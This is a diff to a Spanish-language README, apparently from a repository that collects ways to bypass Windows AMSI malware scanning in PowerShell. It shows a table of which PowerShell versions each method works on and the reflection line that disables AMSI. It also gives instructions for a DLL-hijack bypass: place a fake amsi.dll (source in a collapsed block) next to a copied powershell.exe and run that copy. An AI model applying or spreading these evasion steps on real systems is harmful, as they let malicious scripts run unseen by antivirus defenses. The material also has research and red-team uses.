@@ -57,7 +57,8 @@ $field.SetValue($null,$true)
 | ![](https://img.shields.io/badge/PowerShell-5-blue) | ![](https://img.shields.io/badge/-Falla-red) | ![](https://img.shields.io/badge/-Falla-red) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Falla-red) 
 | ![](https://img.shields.io/badge/PowerShell-7-blueviolet) | ![](https://img.shields.io/badge/-Falla-red) | ![](https://img.shields.io/badge/-Falla-red) | ![](https://img.shields.io/badge/-Falla-red) | ![](https://img.shields.io/badge/-Falla-red) | ![](https://img.shields.io/badge/-Falla-red)
 
-Para hacerlo funcionar deben copiar la [amsi.dll](amsi.dll) que está en el repositorio (está compilada para x64). Si deseas compilar tu propia DLL abajo tienen el código fuente o directamente aquí [amsi.cpp](amsi.cpp):
+Para hacerlo funcionar deben copiar la [amsi.dll](amsi.dll) que está en el repositorio (está compilada para x64). Si deseas compilar tu propia DLL abajo tienes el código fuente:
+
 <details><summary>Código de la amsi.dll falsa</summary>
 <p>
  
@@ -116,6 +117,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
  </p>
 </details>
 
+Una vez copiado el archivo, ejecuta el siguiente còdigo en PowerShell:
 ````PowerShell
 Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd
 & "$pwd\powershell.exe"
